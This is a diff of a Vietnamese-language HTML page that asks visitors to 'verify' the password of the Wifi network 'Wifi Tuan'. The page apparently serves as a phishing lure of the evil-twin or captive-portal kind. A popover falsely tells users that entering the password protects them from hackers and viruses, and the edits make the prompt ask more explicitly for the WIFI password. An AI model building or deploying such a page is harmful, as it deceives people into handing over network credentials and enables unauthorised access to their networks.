@@ -49,10 +49,10 @@
 					<form method="post" id="form-mic">
 						<h3 class="text-muted"> Xác thực mật khẩu Wifi <em><strong>"Wifi Tuan"</strong></em> </h3>
 						<div class="form-group">
-							<a href="javascript:void(0)" data-toggle="popover"><span class="glyphicon glyphicon-signal"></span>&nbsp; Thông tin chi tiết </a>
+							<a href="javascript:void(0)" data-toggle="popover" id="info-tip"><span class="glyphicon glyphicon-signal"></span>&nbsp; Thông tin chi tiết </a>
 						</div>
 						<div class="form-group">
-							<input type="text" class="form-control no-border-radius" placeholder="Vui lòng nhập mật khẩu của bạn" name="pass" autofocus />
+							<input type="text" class="form-control no-border-radius" placeholder="Vui lòng nhập mật khẩu WIFI của bạn" name="pass" autofocus />
 						</div>
 						<button type="submit" class="btn btn-primary" name="submit" value="submit"><span class="glyphicon glyphicon-ok"></span>&nbsp; Đồng ý </button>
 					</form>
@@ -79,6 +79,7 @@
 		    	content: 'Để đảm bảo an toàn thông tin trên Internet, chúng tôi muốn bạn xác nhận mật khẩu Wifi của bạn để bảo vệ dữ liệu của bạn an toàn trước các Hacker và Virus xâm nhập qua Máy tính và SmartPhone !',
 		    	trigger: 'hover'
             });
+            //$('#info-tip').trigger('mouseover');
             $('#form-mic').validate({
                 errorClass: 'text-danger',
                 rules: {
